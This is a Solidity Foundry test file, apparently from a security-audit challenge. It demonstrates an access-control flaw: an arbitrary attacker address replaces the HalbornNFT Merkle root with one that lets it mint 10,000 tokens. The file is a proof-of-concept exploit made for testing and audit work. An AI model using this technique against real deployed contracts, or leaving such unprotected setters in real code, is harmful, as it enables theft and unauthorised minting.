// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {MerkleProofUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/utils/cryptography/MerkleProofUpgradeable.sol";

import {Merkle} from "./murky/Merkle.sol";

import {HalbornNFT} from "../src/HalbornNFT.sol";
import {HalbornToken} from "../src/HalbornToken.sol";
import {HalbornLoans} from "../src/HalbornLoans.sol";

contract HalbornTestMerkle is Test {
    address public immutable ALICE = makeAddr("ALICE");
    bytes32 root;

    HalbornNFT public nft;
    HalbornToken public token;
    HalbornLoans public loans;

    function setUp() public {
        Merkle m = new Merkle();

        bytes32[] memory data = new bytes32[](4);
        data[0] = keccak256(abi.encodePacked(ALICE, uint256(15)));
        root = m.getRoot(data);

        nft = new HalbornNFT();
        nft.initialize(root, 1 ether);
    }

    function testMaliciousMerkleRoot() public {
        //check that the current merkle root is the same as the one set in the setup
        bytes32 currentRoot = nft.merkleRoot();
        assertTrue(nft.merkleRoot() == root);        

        address attacker = address(0xdeadbea7);
        vm.startPrank(attacker);

        // As the attacker, the goal is to mint 10000 NFTs.
        // Start with ids in a point where we know there are no NFTs minted
        // according to the internal `idCounter` variable
        uint256 startPoint = nft.idCounter() + 1;
        uint256 max = 10000;
        bytes32[] memory data = new bytes32[](max);

        for (uint256 i = 0; i < max; i++) {
            data[i] = keccak256(abi.encodePacked(attacker, uint256(startPoint + i)));
        }

        // set the new merkle root
        Merkle m = new Merkle();
        bytes32 newRoot = m.getRoot(data);
        nft.setMerkleRoot(newRoot);
        
        // check that the merkle root has been changed
        assertTrue(nft.merkleRoot() == newRoot);
    }
}
